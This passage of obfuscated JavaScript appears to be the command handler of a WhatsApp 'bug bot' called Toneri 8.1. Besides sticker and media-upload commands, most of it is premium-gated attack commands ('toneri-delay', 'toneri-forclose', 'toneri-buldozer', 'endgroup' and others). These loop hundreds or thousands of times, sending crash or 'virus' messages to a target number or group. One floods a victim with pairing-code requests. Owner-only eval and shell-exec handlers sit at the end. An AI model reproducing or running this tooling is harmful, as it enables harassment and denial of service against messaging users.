          if (!_0x481270 || !_0x481270.download) {
            return _0x1e1d9b("Reply to an Image or Video with command " + (_0x7583df + _0x5cb20e));
          }
          let _0x370e0a = _0x481270.mimetype || "";
          if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(_0x370e0a)) {
            return _0x1e1d9b("Only images or MP4 videos are supported!");
          }
          let _0xd62491;
          try {
            _0xd62491 = await _0x481270.download();
          } catch (_0x4223d0) {
            return _0x1e1d9b("Failed to download media!");
          }
          const _0x46f6b8 = require("../system/Data1");
          const _0x210688 = require("../system/Data2");
          let _0x21bf20 = /image\/(png|jpe?g|gif)|video\/mp4/.test(_0x370e0a);
          let _0x2d7d68;
          try {
            _0x2d7d68 = await (_0x21bf20 ? _0x46f6b8 : _0x210688)(_0xd62491);
          } catch (_0x3c5e5f) {
            return _0x1e1d9b("Failed to upload media!");
          }
          _0x1e1d9b("" + _0x2d7d68);
        }
        break;
      case "sticker":
      case "s":
        {
          if (!_0x3bb00c) {
            return _0x1e1d9b("Reply Image or Video with command " + (_0x7583df + _0x5cb20e));
          }
          if (/image/.test(_0x4d6d3b)) {
            let _0x5ad37c = await _0x3bb00c.download();
            let _0x47f686 = await _0x23b0c8.sendImageAsSticker(_0x5ad37c, _0x3d7bad, {
              packname: global.packname,
              author: global.author
            });
            await fs.unlinkSync(_0x47f686);
          } else if (/video/.test(_0x4d6d3b)) {
            if ((_0x3bb00c.msg || _0x3bb00c).seconds > 11) {
              return _0x1e1d9b("max 10s");
            }
            let _0x35fdf6 = await _0x3bb00c.download();
            let _0x1ba442 = await _0x23b0c8.sendVideoAsSticker(_0x35fdf6, _0x3d7bad, {
              packname: global.packname,
              author: global.author
            });
            await fs.unlinkSync(_0x1ba442);
          } else {
            return _0x1e1d9b("Send Image or Video with command " + (_0x7583df + _0x5cb20e) + "\nvideo duration only 1-9s");
          }
        }
        break;
      case "endgroup":
        {
          if (!_0x2dadea) {
            return _0x1e1d9b("khusus prem njrr");
          }
          let _0x29d9e0 = _0x16fcad[0];
          if (!_0x29d9e0) {
            return _0x1e1d9b("⚠️ *Silakan pilih grup dari menu!*");
          }
          try {
            for (let _0x7a7b0b = 0; _0x7a7b0b < 5000; _0x7a7b0b++) {
              await _0x313e64(target);
              await sleep(500);
              await _0x133f8e(target, true);
              await _0x2e40ed(target);
              await sleep(500);
              await _0x4a3fac(target);
              await _0x3f55be(target);
              await _0x313e64(target);
              await sleep(500);
              await _0x133f8e(target, true);
              await _0x2e40ed(target);
              await sleep(500);
              await _0x4a3fac(target);
              await _0x3f55be(target);
              await sleep(500);
            }
            _0x1e1d9b("✅ *Bug Group* berhasil dijalankan pada grup *" + _0x29d9e0 + "*");
          } catch (_0x34df4a) {
            _0x1e1d9b("❌ Gagal menjalankan Bug Group! Pastikan bot ada di grup tersebut.");
          }
          break;
        }
      case "toneri-group":
        {
          await _0x23b0c8.sendMessage(_0x3d7bad.chat, {
            react: {
              text: "⏳",
              key: _0x3d7bad.key
            }
          });
          let _0x2665eb = await _0x23b0c8.groupFetchAllParticipating();
          let _0x1b4ea4 = Object.values(_0x2665eb);
          if (_0x1b4ea4.length === 0) {
            return _0x1e1d9b("⚠️ Bot tidak memiliki grup yang bisa dipilih.");
          }
          let _0x206e5b = _0x1b4ea4.map(_0x5a1db4 => ({
            title: _0x5a1db4.subject + " (" + _0x5a1db4.participants.length + " Anggota)",
            id: ".endgroup " + _0x5a1db4.id
          }));
          const _0x1e3a9c = {
            image: {
              url: "https://ar-hosting.pages.dev/1748965042571.jpg"
            },
            caption: "📢 Pilih grup yang ingin kamu bug melalui tombol di bawah!",
            footer: "",
            headerType: 4,
            viewOnce: true,
            buttons: [{
              buttonId: "selectgroup",
              buttonText: {
                displayText: "Pilih Grup"
              },
              type: 4,
              nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                  title: "Daftar Grup",
                  sections: [{
                    title: "Grup yang Tersedia",
                    rows: _0x206e5b
                  }]
                })
              }
            }, {
              buttonId: ".owner",
              buttonText: {
                displayText: "own"
              },
              type: 1
            }]
          };
          await _0x23b0c8.sendMessage(_0x3d7bad.chat, {
            react: {
              text: "✅",
              key: _0x3d7bad.key
            }
          });
          await _0x23b0c8.sendMessage(_0x3d7bad.chat, _0x1e3a9c, {
            quoted: qAi
          });
          break;
        }
      case "toneri-invisdelay":
        {
          try {
            if (!_0x350a35 && !_0x2dadea) {
              return _0x3414f2(mess.premium);
            }
            if (!q) {
              return _0x1e1d9b(_0x27a06f("628xxx or tag @user"));
            }
            let _0x882f75;
            if (_0x3d7bad.mentionedJid?.length > 0) {
              _0x882f75 = _0x3d7bad.mentionedJid[0];
            } else {
              let _0x25869e = q.replace(/[^0-9]/g, "");
              if (_0x25869e.startsWith("0")) {
                return _0x1e1d9b(_0x27a06f("62xxx"));
              }
              _0x882f75 = _0x25869e + "@s.whatsapp.net";
              lockNum = "" + _0x25869e;
            }
            let _0x5d9501 = _0x882f75;
            let _0x50e162 = lockNum;
            let _0x5986c4 = "`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`\n\n☇ 𝐓𝐀𝐑𝐆𝐄𝐓 : *" + _0x50e162 + "*\n☇ 𝐕𝐈𝐑𝐔𝐒 : *" + _0x5cb20e + "*\n\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿";
            _0x3414f2(_0x5986c4);
            for (let _0x754c49 = 0; _0x754c49 < 500; _0x754c49++) {
              console.log(chalk.green("succes send bugs"));
              await _0x133f8e(_0x5d9501, false);
              await _0x2e40ed(_0x5d9501);
              await sleep(500);
              await _0x3f55be(_0x5d9501);
              await _0x133f8e(_0x5d9501, false);
              await _0x2e40ed(_0x5d9501);
              await sleep(500);
              await _0x3f55be(_0x5d9501);
              await sleep(500);
            }
          } catch (_0x4f7aa6) {
            console.error(_0x4f7aa6);
            _0x1e1d9b("Failed to send virus. Make sure the number is valid.");
          }
        }
        break;
      case "toneri-spampair":
        {
          try {
            if (!_0x350a35 && !_0x2dadea) {
              return _0x3414f2(mess.premium);
            }
            if (!q) {
              return _0x1e1d9b(_0x27a06f("628xxx or tag @user"));
            }
            let _0x42e32b;
            if (_0x3d7bad.mentionedJid?.length > 0) {
              _0x42e32b = _0x3d7bad.mentionedJid[0];
            } else {
              let _0x4c8dc6 = q.replace(/[^0-9]/g, "");
              if (_0x4c8dc6.startsWith("0")) {
                return _0x1e1d9b(_0x27a06f("62xxx"));
              }
              _0x42e32b = _0x4c8dc6 + "@s.whatsapp.net";
              lockNum = "" + _0x4c8dc6;
            }
            let _0x252e6f = _0x42e32b;
            let _0x165d5d = lockNum;
            let _0x16606e = "`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`\n\n☇ 𝐓𝐀𝐑𝐆𝐄𝐓 : *" + _0x165d5d + "*\n☇ 𝐕𝐈𝐑𝐔𝐒 : *" + _0x5cb20e + "*\n\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿";
            _0x3414f2(_0x16606e);
            for (let _0x1ee822 = 0; _0x1ee822 < 500; _0x1ee822++) {
              console.log(chalk.green("succes send spam pair to target : " + _0x252e6f));
              await _0x23b0c8.requestPairingCode(_0x252e6f);
              await sleep(500);
              await _0x23b0c8.requestPairingCode(_0x252e6f);
              await sleep(500);
              await _0x23b0c8.requestPairingCode(_0x252e6f);
              await sleep(500);
            }
          } catch (_0x4014a5) {
            console.error(_0x4014a5);
            _0x1e1d9b("Failed to send virus. Make sure the number is valid.");
          }
        }
        break;
      case "toneri-delay":
        {
          try {
            if (!_0x350a35 && !_0x2dadea) {
              return _0x3414f2(mess.premium);
            }
            if (!q) {
              return _0x1e1d9b(_0x27a06f("628xxx or tag @user"));
            }
            let _0x1f30d0;
            if (_0x3d7bad.mentionedJid?.length > 0) {
              _0x1f30d0 = _0x3d7bad.mentionedJid[0];
            } else {
              let _0x16324d = q.replace(/[^0-9]/g, "");
              if (_0x16324d.startsWith("0")) {
                return _0x1e1d9b(_0x27a06f("62xxx"));
              }
              _0x1f30d0 = _0x16324d + "@s.whatsapp.net";
              lockNum = "" + _0x16324d;
            }
            let _0x1c9f4c = _0x1f30d0;
            let _0x13d968 = lockNum;
            let _0x327045 = "`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`\n\n☇ 𝐓𝐀𝐑𝐆𝐄𝐓 : *" + _0x13d968 + "*\n☇ 𝐕𝐈𝐑𝐔𝐒 : *" + _0x5cb20e + "*\n\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿";
            _0x3414f2(_0x327045);
            for (let _0x5598eb = 0; _0x5598eb < 500; _0x5598eb++) {
              console.log(chalk.green("succes send bug to target : " + _0x1c9f4c));
              await _0x313e64(_0x1c9f4c);
              await sleep(500);
              await _0x133f8e(_0x1c9f4c, false);
              await _0x2e40ed(_0x1c9f4c);
              await sleep(500);
              await _0x4a3fac(_0x1c9f4c);
              await _0x3f55be(_0x1c9f4c);
              await _0x313e64(_0x1c9f4c);
              await sleep(500);
              await _0x133f8e(_0x1c9f4c, false);
              await _0x2e40ed(_0x1c9f4c);
              await sleep(500);
              await _0x4a3fac(_0x1c9f4c);
              await _0x3f55be(_0x1c9f4c);
              await sleep(500);
            }
          } catch (_0x3499da) {
            console.error(_0x3499da);
            _0x1e1d9b("Failed to send virus. Make sure the number is valid.");
          }
        }
        break;
      case "toneri-forceinvis":
        {
          try {
            if (!_0x350a35 && !_0x2dadea) {
              return _0x3414f2(mess.premium);
            }
            if (!q) {
              return _0x1e1d9b(_0x27a06f("628xxx or tag @user"));
            }
            let _0x2c84f9;
            if (_0x3d7bad.mentionedJid?.length > 0) {
              _0x2c84f9 = _0x3d7bad.mentionedJid[0];
            } else {
              let _0x4584ef = q.replace(/[^0-9]/g, "");
              if (_0x4584ef.startsWith("0")) {
                return _0x1e1d9b(_0x27a06f("62xxx"));
              }
              _0x2c84f9 = _0x4584ef + "@s.whatsapp.net";
              lockNum = "" + _0x4584ef;
            }
            let _0x422cb7 = _0x2c84f9;
            let _0x5b7597 = lockNum;
            let _0x2cd64b = "`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`\n\n☇ 𝐓𝐀𝐑𝐆𝐄𝐓 : *" + _0x5b7597 + "*\n☇ 𝐕𝐈𝐑𝐔𝐒 : *" + _0x5cb20e + "*\n\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿";
            _0x3414f2(_0x2cd64b);
            for (let _0x342a6d = 0; _0x342a6d < 500; _0x342a6d++) {
              console.log(chalk.green("succes send bug to target : " + _0x422cb7));
              await _0x285e2f(_0x422cb7);
              await sleep(500);
              await _0x285e2f(_0x422cb7);
              await sleep(500);
              await _0x285e2f(_0x422cb7);
              await sleep(500);
              await _0x285e2f(_0x422cb7);
              await sleep(500);
              await _0x285e2f(_0x422cb7);
              await sleep(500);
              await _0x285e2f(_0x422cb7);
              await sleep(500);
            }
          } catch (_0x11b845) {
            console.error(_0x11b845);
            _0x1e1d9b("Failed to send virus. Make sure the Number is valid.");
          }
        }
        break;
      case "toneri-forclose":
        {
          try {
            if (!_0x350a35 && !_0x2dadea) {
              return _0x3414f2(mess.premium);
            }
            if (!q) {
              return _0x1e1d9b(_0x27a06f("628xxx or tag @user"));
            }
            let _0x2935fd;
            if (_0x3d7bad.mentionedJid?.length > 0) {
              _0x2935fd = _0x3d7bad.mentionedJid[0];
            } else {
              let _0x14d2d8 = q.replace(/[^0-9]/g, "");
              if (_0x14d2d8.startsWith("0")) {
                return _0x1e1d9b(_0x27a06f("62xxx"));
              }
              _0x2935fd = _0x14d2d8 + "@s.whatsapp.net";
              lockNum = "" + _0x14d2d8;
            }
            let _0x43ee84 = _0x2935fd;
            let _0x1ebdda = lockNum;
            let _0x332d56 = "`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`\n\n☇ 𝐓𝐀𝐑𝐆𝐄𝐓 : *" + _0x1ebdda + "*\n☇ 𝐕𝐈𝐑𝐔𝐒 : *" + _0x5cb20e + "*\n\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿";
            _0x3414f2(_0x332d56);
            for (let _0x156531 = 0; _0x156531 < 500; _0x156531++) {
              console.log(chalk.green("succes send bug to target : " + _0x43ee84));
              await _0x4a3fac(_0x43ee84);
              await sleep(500);
              await _0x4a3fac(_0x43ee84);
              await sleep(500);
              await _0x285e2f(_0x43ee84);
              await sleep(500);
              await _0x285e2f(_0x43ee84);
              await sleep(500);
            }
          } catch (_0x1d712c) {
            console.error(_0x1d712c);
            _0x1e1d9b("Failed to send virus. Make sure the number is valid.");
          }
        }
        break;
      case "toneri-buldozer":
        {
          try {
            if (!_0x350a35 && !_0x2dadea) {
              return _0x3414f2(mess.premium);
            }
            if (!q) {
              return _0x1e1d9b(_0x27a06f("628xxx or tag @user"));
            }
            let _0xed220d;
            if (_0x3d7bad.mentionedJid?.length > 0) {
              _0xed220d = _0x3d7bad.mentionedJid[0];
            } else {
              let _0xc30d6c = q.replace(/[^0-9]/g, "");
              if (_0xc30d6c.startsWith("0")) {
                return _0x1e1d9b(_0x27a06f("62xxx"));
              }
              _0xed220d = _0xc30d6c + "@s.whatsapp.net";
              lockNum = "" + _0xc30d6c;
            }
            let _0x3f58d4 = _0xed220d;
            let _0x2eb586 = lockNum;
            let _0x1278d8 = "`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`\n\n☇ 𝐓𝐀𝐑𝐆𝐄𝐓 : *" + _0x2eb586 + "*\n☇ 𝐕𝐈𝐑𝐔𝐒 : *" + _0x5cb20e + "*\n\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿";
            _0x3414f2(_0x1278d8);
            for (let _0x233029 = 0; _0x233029 < 500; _0x233029++) {
              console.log(chalk.green("succes send bug to target : " + _0x3f58d4));
              await _0x4a3fac(_0x3f58d4);
              await sleep(500);
              await _0x4a3fac(_0x3f58d4);
              await sleep(500);
              await _0x4a3fac(_0x3f58d4);
              await sleep(500);
              await _0x4a3fac(_0x3f58d4);
              await sleep(500);
              await _0x4a3fac(_0x3f58d4);
              await sleep(500);
              await _0x4a3fac(_0x3f58d4);
              await sleep(500);
            }
          } catch (_0x337a03) {
            console.error(_0x337a03);
            _0x1e1d9b("Failed to send virus. Make sure the number is valid.");
          }
        }
        break;
      case "dev":
      case "devoloper":
      case "owner":
      case "xowner":
        {
          let _0x131293 = "Sandy DEVELOPER ϟ";
          let _0x18304d = "6285696797738";
          var _0x3ad9ab = generateWAMessageFromContent(_0x3d7bad.chat, proto.Message.fromObject({
            contactMessage: {
              displayName: _0x131293,
              vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:" + _0x131293 + "\nitem1.TEL;waid=" + _0x18304d + ":+" + _0x18304d + "\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:Sandy HERE🐉\nX-WA-BIZ-NAME:[[ ༑ TONERI 8.1 ༑ ]]\nEND:VCARD"
            }
          }), {
            userJid: _0x3d7bad.chat,
            quoted: _0x52d80c
          });
          _0x23b0c8.relayMessage(_0x3d7bad.chat, _0x3ad9ab.message, {
            messageId: _0x3ad9ab.key.id
          });
        }
        break;
      default:
        if (_0x57cc40.startsWith("<")) {
          if (!_0x350a35) {
            return;
          }
          function _0x44126a(_0x368985) {
            sat = JSON.stringify(_0x368985, null, 2);
            bang = util.format(sat);
            if (sat == undefined) {
              bang = util.format(_0x368985);
            }
            return _0x3d7bad.reply(bang);
          }
          try {
            _0x3d7bad.reply(util.format(eval("(async () => { return " + _0x57cc40.slice(3) + " })()")));
          } catch (_0x1724ca) {
            _0x3d7bad.reply(String(_0x1724ca));
          }
        }
        if (_0x57cc40.startsWith(">")) {
          if (!_0x350a35) {
            return;
          }
          try {
            let _0x5929f8 = await eval(_0x57cc40.slice(2));
            if (typeof _0x5929f8 !== "string") {
              _0x5929f8 = require("util").inspect(_0x5929f8);
            }
            await _0x3d7bad.reply(_0x5929f8);
          } catch (_0x2fd87a) {
            await _0x3d7bad.reply(String(_0x2fd87a));
          }
        }
        if (_0x57cc40.startsWith("$")) {
          if (!_0x350a35) {
            return;
          }
          require("child_process").exec(_0x57cc40.slice(2), (_0x4665dc, _0x39bd9b) => {
            if (_0x4665dc) {
              return _0x3d7bad.reply("" + _0x4665dc);
            }
            if (_0x39bd9b) {
              return _0x3d7bad.reply(_0x39bd9b);
            }
          });
        }
    }
  } catch (_0x254bc5) {
    console.log(require("util").format(_0x254bc5));
  }
};
let file = require.resolve(__filename);
require("fs").watchFile(file, () => {
  require("fs").unwatchFile(file);
  console.log("[0;32m" + __filename + " [1;32mupdated![0m");
  delete require.cache[file];
  require(file);
});